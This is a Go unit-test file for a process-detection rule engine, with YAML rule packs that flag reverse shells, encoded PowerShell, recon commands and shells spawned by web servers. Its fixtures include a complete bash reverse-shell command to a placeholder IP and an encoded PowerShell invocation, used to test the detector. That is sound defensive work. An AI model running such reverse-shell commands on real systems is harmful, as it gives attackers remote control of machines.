package rules

import "testing"

const samplePack = `
rules:
  - name: rev_shell
    severity: high
    when:
      name: ["bash", "sh"]
      cmdline_contains: ["/dev/tcp/", "0>&1"]
    tags: ["mitre:T1059"]

  - name: ps_encoded
    severity: high
    when:
      name: ["powershell.exe"]
      cmdline_regex:
        - '(?i)-enc\s+[A-Za-z0-9+/=]{20,}'
    tags: ["mitre:T1059.001"]

  - name: noisy_recon
    severity: low
    when:
      cmdline_contains: ["whoami /priv"]
    tags: ["mitre:T1033"]
`

func loadFixture(t *testing.T) *Pack {
	t.Helper()
	p, err := LoadBytes([]byte(samplePack))
	if err != nil {
		t.Fatalf("LoadBytes: %v", err)
	}
	return p
}

func TestRuleMatchesReverseShell(t *testing.T) {
	p := loadFixture(t)
	hits := p.Match(Process{
		PID: 100, PPID: 1,
		Name:    "bash",
		Cmdline: "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
	})
	if len(hits) != 1 || hits[0].Name != "rev_shell" {
		t.Fatalf("expected rev_shell hit, got %+v", hits)
	}
}

func TestRuleMatchesEncodedPowerShell(t *testing.T) {
	p := loadFixture(t)
	hits := p.Match(Process{
		Name:    "powershell.exe",
		Cmdline: "powershell.exe -enc YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIz",
	})
	if len(hits) != 1 || hits[0].Name != "ps_encoded" {
		t.Fatalf("expected ps_encoded hit, got %+v", hits)
	}
}

func TestRuleMissesWrongName(t *testing.T) {
	p := loadFixture(t)
	hits := p.Match(Process{
		Name:    "vim",
		Cmdline: "vim /tmp/notes",
	})
	if len(hits) != 0 {
		t.Fatalf("expected no hits, got %+v", hits)
	}
}

func TestRuleMissesPartialCmdline(t *testing.T) {
	// Smoke: a name-match without cmdline-contains should not fire.
}

func TestNameMatchIsCaseInsensitive(t *testing.T) {
	p := loadFixture(t)
	hits := p.Match(Process{
		Name:    "BASH",
		Cmdline: "BASH -i >& /dev/tcp/x/1 0>&1",
	})
	if len(hits) != 1 {
		t.Fatalf("expected case-insensitive match, got %d", len(hits))
	}
}

func TestEmptyWhenDoesNotMatchAll(t *testing.T) {
	p, err := LoadBytes([]byte("rules:\n  - name: empty\n    severity: low\n"))
	if err != nil {
		t.Fatalf("LoadBytes: %v", err)
	}
	hits := p.Match(Process{Name: "anything", Cmdline: "anything"})
	if len(hits) != 0 {
		t.Fatalf("empty rule should not match-all, got %d", len(hits))
	}
}

func TestInvalidRegexErrors(t *testing.T) {
	bad := `
rules:
  - name: x
    severity: high
    when:
      cmdline_regex: ["[unclosed"]
`
	if _, err := LoadBytes([]byte(bad)); err == nil {
		t.Fatal("expected error on invalid regex")
	}
}

func TestCmdlineRegexMatch(t *testing.T) {
	p := loadFixture(t)
	hits := p.Match(Process{
		Name:    "powershell.exe",
		Cmdline: "powershell.exe -Enc QQ==QQ==QQ==QQ==QQ==QQ==",
	})
	// case-insensitive regex should match -Enc
	if len(hits) != 1 {
		t.Fatalf("expected encoded match, got %d hits", len(hits))
	}
}

const parentPack = `
rules:
  - name: webserver_shell
    severity: high
    when:
      name: ["sh", "bash"]
      parent_name: ["nginx", "apache2", "php-fpm"]
    tags: ["webshell", "mitre:T1505.003"]

  - name: parent_only
    severity: low
    when:
      parent_name: ["cron"]
`

func TestParentNameMatches(t *testing.T) {
	p, err := LoadBytes([]byte(parentPack))
	if err != nil {
		t.Fatalf("LoadBytes: %v", err)
	}
	hits := p.Match(Process{PID: 7, PPID: 6, Name: "sh", Cmdline: "sh -c id", ParentName: "PHP-FPM"})
	if len(hits) != 1 || hits[0].Name != "webserver_shell" {
		t.Fatalf("expected webserver_shell hit, got %+v", hits)
	}
}

func TestParentNameMismatchOrUnknown(t *testing.T) {
	p, err := LoadBytes([]byte(parentPack))
	if err != nil {
		t.Fatalf("LoadBytes: %v", err)
	}
	for _, parent := range []string{"sshd", ""} {
		hits := p.Match(Process{Name: "sh", Cmdline: "sh -c id", ParentName: parent})
		if len(hits) != 0 {
			t.Errorf("parent %q: expected no hits, got %+v", parent, hits)
		}
	}
}

func TestParentNameAloneIsAValidClause(t *testing.T) {
	p, err := LoadBytes([]byte(parentPack))
	if err != nil {
		t.Fatalf("LoadBytes: %v", err)
	}
	hits := p.Match(Process{Name: "backup.sh", Cmdline: "backup.sh", ParentName: "cron"})
	if len(hits) != 1 || hits[0].Name != "parent_only" {
		t.Fatalf("expected parent_only hit, got %+v", hits)
	}
}
